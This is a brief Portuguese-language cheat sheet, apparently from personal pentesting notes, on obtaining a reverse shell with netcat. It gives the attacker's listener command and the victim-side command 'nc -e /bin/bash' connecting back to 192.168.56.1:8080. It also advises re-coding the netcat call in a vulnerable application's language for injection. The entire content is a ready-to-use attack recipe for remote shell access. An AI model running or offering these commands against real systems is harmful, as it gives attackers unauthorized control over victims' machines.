===RRECEBER SHEL REVERSO===
Enviar/Receber Shell reverso:

ATACANTE-No lado servidor, ou seja, o lado que receberá o shell
reverso da vítima:
$ nc -lvnp 8080

VITIMA-No lado do cliente, ou seja o lado que enviará o arquivo,
execute:
$ nc -e /bin/bash -vn 192.168.56.1 8080
OBS: é importante verificar se o usuário q vc ganhou possui acesso a shell, e caso seja uma 
vulnerabilidade de aplicação, ver qual a linguagem será ejetada e codificar 
o "nc" nessa linguagem.
